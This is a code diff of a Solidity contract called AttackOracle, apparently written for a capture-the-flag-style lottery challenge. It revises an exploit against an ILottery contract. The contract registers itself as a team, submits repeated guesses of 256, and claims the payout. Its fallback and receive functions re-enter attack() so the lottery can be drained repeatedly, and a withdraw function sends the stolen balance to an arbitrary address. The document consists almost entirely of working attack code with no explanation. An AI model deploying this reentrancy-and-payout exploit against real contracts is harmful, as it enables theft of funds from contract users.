@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.0;
+pragma solidity 0.8.17;
 
 interface ILottery {
     function registerTeam(address _walletAddress, string calldata _teamName, string calldata _password) external payable;
@@ -15,29 +15,33 @@ contract AttackOracle { // 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A
     }
 
     function attack() public {
-
+        lottery.makeAGuess(address(this), 256);
         lottery.payoutWinningTeam(address(this));    
     }
 
-    function setup() public {
-        lottery.registerTeam{value: 1_000_001 }(address(this), "Team_3", "123abc");
-        
-        for(uint i; i < 20 ; i++) {
-            lottery.makeAGuess(address(this), 51);
+    function setup() public payable {
+        lottery.registerTeam{value: 1_000_000_000}(address(this), "Team_Name", "Password");
+
+        for(uint i; i < 11 ; i++) {
+            lottery.makeAGuess(address(this), 256);
             i++;       
-        } 
+        }
     }
 
-    function withdraw(address payout) public returns(bool) {
-        (bool sent, ) = address(payout).call{value: address(this).balance }("");
-        require(sent);
-        return sent;
+    function reg() public {
+        lottery.registerTeam(address(this), "333222222", "123abc");
+    }
+
+    function withdraw(address payable payout) public {
+        (bool success, ) = address(payout).call{value: address(this).balance}('');
+        require(success, "Failed to withdraw");
     }
 
     fallback() external payable {
-        attack();
+         attack();
     }
 
     receive() external payable {
+         attack();   
     }
 }
